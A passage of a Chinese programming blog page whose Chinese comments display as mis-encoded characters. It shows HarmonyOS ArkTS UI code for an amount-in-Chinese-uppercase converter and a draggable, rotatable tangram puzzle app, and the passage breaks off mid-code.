å­å…ƒç´ æ°´å¹³åˆ†å¸ƒæ–¹å¼</span></span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>); <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">            <span class="title class_">Divider</span>().<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="number">5</span>, <span class="attr">bottom</span>: <span class="number">5</span> &#125;); <span class="comment">// åˆ†å‰²çº¿</span></span><br><span class="line">            <span class="title class_">Row</span>() &#123;</span><br><span class="line">              <span class="title class_">Text</span>(<span class="string">`å¤§å†™é‡‘é¢ï¼š<span class="subst">$&#123;<span class="variable language_">this</span>.chineseUppercaseAmount&#125;</span>`</span>).<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>).<span class="title function_">fontSize</span>(<span class="number">18</span>).<span class="title function_">layoutWeight</span>(<span class="number">1</span>); <span class="comment">// æ˜¾ç¤ºå¤§å†™é‡‘é¢ç»“æœ</span></span><br><span class="line">              <span class="title class_">Text</span>(<span class="string">&#x27;å¤åˆ¶&#x27;</span>)</span><br><span class="line">                .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>) <span class="comment">// è®¾ç½®å­—ä½“é¢œè‰²</span></span><br><span class="line">                .<span class="title function_">fontSize</span>(<span class="number">18</span>) <span class="comment">// è®¾ç½®å­—ä½“å¤§å°</span></span><br><span class="line">                .<span class="title function_">padding</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding / <span class="number">2</span>&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®å†…è¾¹è·</span></span><br><span class="line">                .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#0052d9&quot;</span>) <span class="comment">// è®¾ç½®èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">                .<span class="title function_">borderRadius</span>(<span class="number">5</span>) <span class="comment">// è®¾ç½®åœ†è§’</span></span><br><span class="line">                .<span class="title function_">clickEffect</span>(&#123; <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">LIGHT</span>, <span class="attr">scale</span>: <span class="number">0.8</span> &#125;) <span class="comment">// è®¾ç½®ç‚¹å‡»æ•ˆæœ</span></span><br><span class="line">                .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// ç‚¹å‡»äº‹ä»¶</span></span><br><span class="line">                  <span class="variable language_">this</span>.<span class="title function_">copyToClipboard</span>(<span class="variable language_">this</span>.<span class="property">chineseUppercaseAmount</span>); <span class="comment">// å¤åˆ¶å¤§å†™é‡‘é¢ç»“æœåˆ°å‰ªè´´æ¿</span></span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;.<span class="title function_">constraintSize</span>(&#123; <span class="attr">minHeight</span>: <span class="number">45</span> &#125;) <span class="comment">// æœ€å°é«˜åº¦</span></span><br><span class="line">            .<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">SpaceBetween</span>) <span class="comment">// å­å…ƒç´ æ°´å¹³åˆ†å¸ƒæ–¹å¼</span></span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>); <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">          &#125;</span><br><span class="line">          .<span class="title function_">alignItems</span>(<span class="title class_">HorizontalAlign</span>.<span class="property">Start</span>) <span class="comment">// å¯¹é½æ–¹å¼</span></span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">&#x27;650lpx&#x27;</span>) <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">          .<span class="title function_">padding</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®å†…è¾¹è·</span></span><br><span class="line">          .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span> &#125;) <span class="comment">// è®¾ç½®å¤–è¾¹è·</span></span><br><span class="line">          .<span class="title function_">borderRadius</span>(<span class="number">10</span>) <span class="comment">// è®¾ç½®åœ†è§’</span></span><br><span class="line">          .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>) <span class="comment">// è®¾ç½®èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">          .<span class="title function_">shadow</span>(&#123; <span class="comment">// æ·»åŠ é˜´å½±æ•ˆæœ</span></span><br><span class="line">            <span class="attr">radius</span>: <span class="number">10</span>, <span class="comment">// é˜´å½±åŠå¾„</span></span><br><span class="line">            <span class="attr">color</span>: <span class="variable language_">this</span>.<span class="property">lineColor</span>, <span class="comment">// é˜´å½±é¢œè‰²</span></span><br><span class="line">            <span class="attr">offsetX</span>: <span class="number">0</span>, <span class="comment">// Xè½´åç§»é‡</span></span><br><span class="line">            <span class="attr">offsetY</span>: <span class="number">0</span> <span class="comment">// Yè½´åç§»é‡</span></span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;.<span class="title function_">scrollBar</span>(<span class="title class_">BarState</span>.<span class="property">Off</span>).<span class="title function_">clip</span>(<span class="literal">false</span>); <span class="comment">// å…³é—­æ»šåŠ¨æ¡ï¼Œä¸å…è®¸è£å‰ª</span></span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// è®¾ç½®é«˜åº¦</span></span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">    .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#f4f8fb&quot;</span>); <span class="comment">// è®¾ç½®é¡µé¢èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><!--erweimahttps://blog.csdn.net/zhongcongxu01/article/details/144009716---><h1 id="Tangram"><a href="#Tangram" class="headerlink" title="Tangram"></a>Tangram</h1><p>ä¸ƒå·§æ¿</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">@<span class="title class_">ObservedV2</span> <span class="comment">// ç›‘å¬æ•°æ®å˜åŒ–çš„è£…é¥°å™¨</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TangramBlock</span> &#123; <span class="comment">// å®šä¹‰ä¸ƒå·§æ¿ç±»</span></span><br><span class="line">  <span class="attr">width</span>: number; <span class="comment">// å®½åº¦</span></span><br><span class="line">  <span class="attr">height</span>: number; <span class="comment">// é«˜åº¦</span></span><br><span class="line">  <span class="attr">points</span>: <span class="title class_">Array</span>&lt;[number, number]&gt;; <span class="comment">// ç‚¹åæ ‡æ•°ç»„</span></span><br><span class="line">  <span class="attr">color</span>: string; <span class="comment">// é¢œè‰²</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">initialOffsetX</span>: number; <span class="comment">// åˆå§‹Xåç§»é‡</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">initialOffsetY</span>: number; <span class="comment">// åˆå§‹Yåç§»é‡</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">currentOffsetX</span>: number; <span class="comment">// å½“å‰Xåç§»é‡</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">currentOffsetY</span>: number; <span class="comment">// å½“å‰Yåç§»é‡</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">rotationAngle</span>: number; <span class="comment">// æ—‹è½¬è§’åº¦</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">flipAngle</span>: number = <span class="number">0</span>; <span class="comment">// ç¿»è½¬è§’åº¦ï¼Œé»˜è®¤ä¸º0</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">rotateValue</span>: number; <span class="comment">// æ—‹è½¬å€¼</span></span><br><span class="line">  <span class="attr">defaultInitialOffsetX</span>: number; <span class="comment">// é»˜è®¤åˆå§‹Xåç§»é‡</span></span><br><span class="line">  <span class="attr">defaultInitialOffsetY</span>: number; <span class="comment">// é»˜è®¤åˆå§‹Yåç§»é‡</span></span><br><span class="line">  <span class="attr">defaultRotationAngle</span>: number; <span class="comment">// é»˜è®¤æ—‹è½¬è§’åº¦</span></span><br><span class="line"> </span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">color: string, width: number, height: number, initialOffsetX: number, initialOffsetY: number,</span></span><br><span class="line"><span class="params">    rotationAngle: number, points: <span class="built_in">Array</span>&lt;[number, number]&gt;</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">initialOffsetX</span> = <span class="variable language_">this</span>.<span class="property">currentOffsetX</span> = <span class="variable language_">this</span>.<span class="property">defaultInitialOffsetX</span> = initialOffsetX; <span class="comment">// åˆå§‹åŒ–Xåç§»é‡</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">initialOffsetY</span> = <span class="variable language_">this</span>.<span class="property">currentOffsetY</span> = <span class="variable language_">this</span>.<span class="property">defaultInitialOffsetY</span> = initialOffsetY; <span class="comment">// åˆå§‹åŒ–Yåç§»é‡</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="variable language_">this</span>.<span class="property">rotateValue</span> = <span class="variable language_">this</span>.<span class="property">defaultRotationAngle</span> = rotationAngle; <span class="comment">// åˆå§‹åŒ–æ—‹è½¬è§’åº¦</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">color</span> = color; <span class="comment">// è®¾ç½®é¢œè‰²</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">width</span> = width; <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">height</span> = height; <span class="comment">// è®¾ç½®é«˜åº¦</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">points</span> = points; <span class="comment">// è®¾ç½®ç‚¹åæ ‡æ•°ç»„</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">resetData</span>(<span class="params"></span>) &#123; <span class="comment">// é‡ç½®æ•°æ®æ–¹æ³•</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">flipAngle</span> = <span class="number">0</span>; <span class="comment">// é‡ç½®ç¿»è½¬è§’åº¦</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">initialOffsetX</span> = <span class="variable language_">this</span>.<span class="property">currentOffsetX</span> = <span class="variable language_">this</span>.<span class="property">defaultInitialOffsetX</span>; <span class="comment">// é‡ç½®åˆå§‹Xåç§»é‡</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">initialOffsetY</span> = <span class="variable language_">this</span>.<span class="property">currentOffsetY</span> = <span class="variable language_">this</span>.<span class="property">defaultInitialOffsetY</span>; <span class="comment">// é‡ç½®åˆå§‹Yåç§»é‡</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="variable language_">this</span>.<span class="property">rotateValue</span> = <span class="variable language_">this</span>.<span class="property">defaultRotationAngle</span>; <span class="comment">// é‡ç½®æ—‹è½¬è§’åº¦</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> <span class="attr">baseUnitLength</span>: number = <span class="number">80</span>; <span class="comment">// åŸºæœ¬å•ä½é•¿åº¦</span></span><br><span class="line"> </span><br><span class="line">@<span class="title class_">Entry</span> <span class="comment">// å…¥å£ç»„ä»¶</span></span><br><span class="line">@<span class="title class_">Component</span> <span class="comment">// å®šä¹‰ç»„ä»¶</span></span><br><span class="line"><span class="keyword">export</span> struct <span class="title class_">Index</span> &#123; <span class="comment">// ä¸»ç»„ä»¶</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">selectedBlockIndex</span>: number = -<span class="number">1</span>; <span class="comment">// å½“å‰é€‰ä¸­ä½ç½®</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">blocks</span>: <span class="title class_">TangramBlock</span>[] = [<span class="comment">// ä¸ƒå·§æ¿æ•°ç»„</span></span><br><span class="line">  <span class="comment">// å°ç›´è§’ç­‰è…°ä¸‰è§’å½¢</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">TangramBlock</span>(<span class="string">&quot;#fed8e5&quot;</span>, baseUnitLength, baseUnitLength, -<span class="number">33.58</span>, -<span class="number">58.02</span>, <span class="number">135</span>,</span><br><span class="line">      [[<span class="number">0</span>, <span class="number">0</span>], [baseUnitLength, <span class="number">0</span>], [<span class="number">0</span>, baseUnitLength]]),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">TangramBlock</span>(<span class="string">&quot;#0a0bef&quot;</span>, baseUnitLength, baseUnitLength, <span class="number">78.76</span>, <span class="number">54.15</span>, <span class="number">45</span>,</span><br><span class="line">      [[<span class="number">0</span>, <span class="number">0</span>], [baseUnitLength, <span class="number">0</span>], [<span class="number">0</span>, baseUnitLength]]),</span><br><span class="line">    <span class="comment">// ä¸­ç›´è§’ç­‰è…°ä¸‰è§’å½¢</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">TangramBlock</span>(<span class="string">&quot;#ff0d0c&quot;</span>, baseUnitLength * <span class="title class_">Math</span>.<span class="title function_">sqrt</span>(<span class="number">2</span>), baseUnitLength * <span class="title class_">Math</span>.<span class="title function_">sqrt</span>(<span class="number">2</span>), -<span class="number">33.16</span>, -<span class="number">1.43</span>, -<span class="number">90</span>,</span><br><span class="line">      [[<span class="number">0</span>, <span class="number">0</span>], [baseUnitLength * <span class="title class_">Math</span>.<span class="title function_">sqrt</span>(<span class="number">2</span>), <span class="number">0</span>], [<span class="number">0</span>, baseUnitLength * <span class="title class_">Math</span>.<span class="title function_">sqrt</span>(<span class="number">2</span>)]]),</span><br><span class="line">    <span class="comment">// å¤§ç›´è§’ç­‰è…°ä¸‰è§’å½¢</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">TangramBlock</span>(<span class="string">&quot;#ffa60a&quot;</span>, baseUnitLength * <span class="number">2</span>, baseUnitLength * <span class="number">2</span>, <span class="number">22.46</span>, -<span class="number">172</span>, -<span class="number">135</span>,</span><br><span class="line">      [[<span class="number">0</span>, <span class="number">0</span>], [baseUnitLength * <span class="number">2</span>, <span class="number">0</span>], [<span class="number">0</span>, baseUnitLength * <span class="number">2</span>]]),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">TangramBlock</span>(<span class="string">&quot;#3da56a&quot;</span>, baseUnitLength * <span class="number">2</span>, baseUnitLength * <span class="number">2</span>, <span class="number">135.65</span>, -<span class="number">59.34</span>, -<span class="number">45</span>,</span><br><span class="line">      [[<span class="number">0</span>, <span class="number">0</span>], [baseUnitLength * <span class="number">2</span>, <span class="number">0</span>], [<span class="number">0</span>, baseUnitLength * <span class="number">2</span>]]),</span><br><span class="line">    <span class="comment">// æ­£æ–¹å½¢</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">TangramBlock</span>(<span class="string">&quot;#ffff0b&quot;</span>, baseUnitLength, baseUnitLength, <span class="number">23.07</span>, -<span class="number">1.84</span>, -<span class="number">45</span>,</span><br><span class="line">      [[<span class="number">0</span>, <span class="number">0</span>], [baseUnitLength, <span class="number">0</span>], [baseUnitLength, baseUnitLength], [<span class="number">0</span>, baseUnitLength]]),</span><br><span class="line">    <span class="comment">// å¹³è¡Œå››è¾¹å½¢</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">TangramBlock</span>(<span class="string">&quot;#5e0b9b&quot;</span>, baseUnitLength * <span class="number">2</span>, baseUnitLength, -<span class="number">61.53</span>, -<span class="number">85.97</span>, <span class="number">45</span>,</span><br><span class="line">      [[<span class="number">0</span>, <span class="number">0</span>], [baseUnitLength, <span class="number">0</span>], [baseUnitLength * <span class="number">2</span>, baseUnitLength], [baseUnitLength, baseUnitLength]])</span><br><span class="line">  ];</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123; <span class="comment">// æ„å»ºæ–¹æ³•</span></span><br><span class="line">    <span class="title class_">Column</span>(&#123; <span class="attr">space</span>: <span class="number">30</span> &#125;) &#123; <span class="comment">// åˆ›å»ºå‚ç›´å¸ƒå±€</span></span><br><span class="line">      <span class="title class_">Stack</span>() &#123; <span class="comment">// åˆ›å»ºå †å å¸ƒå±€</span></span><br><span class="line">        <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">blocks</span>, <span class="function">(<span class="params">block: TangramBlock, index: number</span>) =&gt;</span> &#123; <span class="comment">// éå†ä¸ƒå·§æ¿æ•°ç»„</span></span><br><span class="line">          <span class="title class_">Stack</span>() &#123; <span class="comment">// åˆ›å»ºå †å å¸ƒå±€</span></span><br><span class="line">            <span class="title class_">Polygon</span>(&#123; <span class="attr">width</span>: block.<span class="property">width</span>, <span class="attr">height</span>: block.<span class="property">height</span> &#125;)<span class="comment">// ç»˜åˆ¶å¤šè¾¹å½¢</span></span><br><span class="line">              .<span class="title function_">points</span>(block.<span class="property">points</span>)<span class="comment">// è®¾ç½®å¤šè¾¹å½¢é¡¶ç‚¹åæ ‡</span></span><br><span class="line">              .<span class="title function_">fill</span>(block.<span class="property">color</span>)<span class="comment">// å¡«å……é¢œè‰²</span></span><br><span class="line">              .<span class="title function_">draggable</span>(<span class="literal">false</span>)<span class="comment">// é•¿æŒ‰ä¸å¯æ‹–åŠ¨</span></span><br><span class="line">              .<span class="title function_">rotate</span>(&#123; <span class="attr">angle</span>: block.<span class="property">rotationAngle</span> &#125;) <span class="comment">// æ—‹è½¬è§’åº¦</span></span><br><span class="line">          &#125;</span><br><span class="line">          .<span class="title function_">rotate</span>(&#123;</span><br><span class="line">            <span class="comment">// æ—‹è½¬</span></span><br><span class="line">            <span class="attr">x</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">y</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">z</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">angle</span>: block.<span class="property">flipAngle</span>,</span><br><span class="line">            <span class="attr">centerX</span>: block.<span class="property">width</span> / <span class="number">2</span>, <span class="comment">// ä¸­å¿ƒç‚¹Xåæ ‡</span></span><br><span class="line">            <span class="attr">centerY</span>: block.<span class="property">height</span> / <span class="number">2</span>, <span class="comment">// ä¸­å¿ƒç‚¹Yåæ ‡</span></span><br><span class="line">          &#125;)</span><br><span class="line">          .<span class="title function_">width</span>(block.<span class="property">width</span>) <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">          .<span class="title function_">height</span>(block.<span class="property">height</span>) <span class="comment">// è®¾ç½®é«˜åº¦</span></span><br><span class="line">          .<span class="title function_">onTouch</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// è§¦æ‘¸äº‹ä»¶</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span> = index; <span class="comment">// è®¾ç½®é€‰ä¸­ç´¢å¼•</span></span><br><span class="line">          &#125;)</span><br><span class="line">          .<span class="title function_">draggable</span>(<span class="literal">false</span>) <span class="comment">// é•¿æŒ‰ä¸å¯æ‹–åŠ¨</span></span><br><span class="line">          .<span class="title function_">translate</span>(&#123; <span class="attr">x</span>: block.<span class="property">initialOffsetX</span>, <span class="attr">y</span>: block.<span class="property">initialOffsetY</span>, <span class="attr">z</span>: <span class="number">0</span> &#125;) <span class="comment">// å¹³ç§»</span></span><br><span class="line">          .<span class="title function_">gesture</span>( <span class="comment">// æ‰‹åŠ¿æ“ä½œ</span></span><br><span class="line">            <span class="title class_">PanGesture</span>()<span class="comment">// æ‹–åŠ¨æ‰‹åŠ¿</span></span><br><span class="line">              .<span class="title function_">onActionUpdate</span>(<span class="function">(<span class="params">event: GestureEvent | <span class="literal">undefined</span></span>) =&gt;</span> &#123; <span class="comment">// æ›´æ–°äº‹ä»¶</span></span><br><span class="line">                <span class="keyword">if</span> (event) &#123;</span><br><span class="line">                  block.<span class="property">initialOffsetX</span> = block.<span class="property">currentOffsetX</span> + event.<span class="property">offsetX</span>; <span class="comment">// æ›´æ–°Xåç§»é‡</span></span><br><span class="line">                  block.<span class="property">initialOffsetY</span> = block.<span class="property">currentOffsetY</span> + event.<span class="property">offsetY</span>; <span class="comment">// æ›´æ–°Yåç§»é‡</span></span><br><span class="line">                &#125;</span><br><span class="line">              &#125;)</span><br><span class="line">              .<span class="title function_">onActionEnd</span>(<span class="function">(<span class="params">event: GestureEvent | <span class="literal">undefined</span></span>) =&gt;</span> &#123; <span class="comment">// ç»“æŸäº‹ä»¶</span></span><br><span class="line">                <span class="keyword">if</span> (event) &#123;</span><br><span class="line">                  block.<span class="property">currentOffsetX</span> = block.<span class="property">initialOffsetX</span>; <span class="comment">// æ›´æ–°å½“å‰Xåç§»é‡</span></span><br><span class="line">                  block.<span class="property">currentOffsetY</span> = block.<span class="property">initialOffsetY</span>; <span class="comment">// æ›´æ–°å½“å‰Yåç§»é‡</span></span><br><span class="line">                &#125;</span><br><span class="line">              &#125;)</span><br><span class="line">          )</span><br><span class="line">          .<span class="title function_">zIndex</span>(<span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span> == index ? <span class="number">1</span> : <span class="number">0</span>) <span class="comment">// è®¾ç½®å±‚çº§</span></span><br><span class="line">          .<span class="title function_">borderWidth</span>(<span class="number">2</span>) <span class="comment">// è¾¹æ¡†å®½åº¦</span></span><br><span class="line">          .<span class="title function_">borderStyle</span>(<span class="title class_">BorderStyle</span>.<span class="property">Dashed</span>) <span class="comment">// è¾¹æ¡†æ ·å¼</span></span><br><span class="line">          .<span class="title function_">borderColor</span>(<span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span> == index ? <span class="string">&quot;#80a8a8a8&quot;</span> : <span class="title class_">Color</span>.<span class="property">Transparent</span>) <span class="comment">// è¾¹æ¡†é¢œè‰²</span></span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">height</span>(<span class="string">&#x27;750lpx&#x27;</span>) <span class="comment">// è®¾ç½®å®½é«˜</span></span><br><span class="line">      .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#e4f2f5&quot;</span>) <span class="comment">// èƒŒæ™¯é¢œè‰²</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">      <span class="comment">// æ—‹è½¬è§’åº¦è®¡æ•°å™¨</span></span><br><span class="line">      <span class="title class_">Column</span>(&#123; <span class="attr">space</span>: <span class="number">5</span> &#125;) &#123; <span class="comment">// åˆ›å»ºå‚ç›´å¸ƒå±€ï¼Œè®¾ç½®é—´è·</span></span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">`æ—‹è½¬è§’åº¦(é—´éš”5)`</span>).<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">Black</span>) <span class="comment">// æ˜¾ç¤ºæ—‹è½¬è§’åº¦æ–‡æœ¬ï¼Œè®¾ç½®å­—ä½“é¢œè‰²</span></span><br><span class="line">        <span class="title class_">Counter</span>() &#123; <span class="comment">// åˆ›å»ºè®¡æ•°å™¨ç»„ä»¶</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.selectedBlockIndex != -<span class="number">1</span> ? <span class="variable language_">this</span>.blocks[<span class="variable language_">this</span>.selectedBlockIndex].rotationAngle :</span></span></span><br><span class="line"><span class="subst"><span class="string">            <span class="string">&#x27;-&#x27;</span>&#125;</span>`</span>)<span class="comment">// æ˜¾ç¤ºå½“å‰é€‰ä¸­ä¸ƒå·§æ¿çš„æ—‹è½¬è§’åº¦æˆ–å ä½ç¬¦</span></span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">Black</span>) <span class="comment">// è®¾ç½®å­—ä½“é¢œè‰²</span></span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">width</span>(<span class="number">300</span>) <span class="comment">// è®¾ç½®è®¡æ•°å™¨å®½åº¦</span></span><br><span class="line">        .<span class="title function_">onInc</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// å¢åŠ æŒ‰é’®çš„ç‚¹å‡»äº‹ä»¶</span></span><br><span class="line">          <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span> != -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="title function_">animateTo</span>(&#123;&#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">blocks</span>[<span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span>].<span class="property">rotationAngle</span> += <span class="number">5</span>; <span class="comment">// å¢åŠ æ—‹è½¬è§’åº¦</span></span><br><span class="line">            &#125;)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;).<span class="title function_">onDec</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// å‡å°‘æŒ‰é’®çš„ç‚¹å‡»äº‹ä»¶</span></span><br><span class="line">          <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span> != -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="title 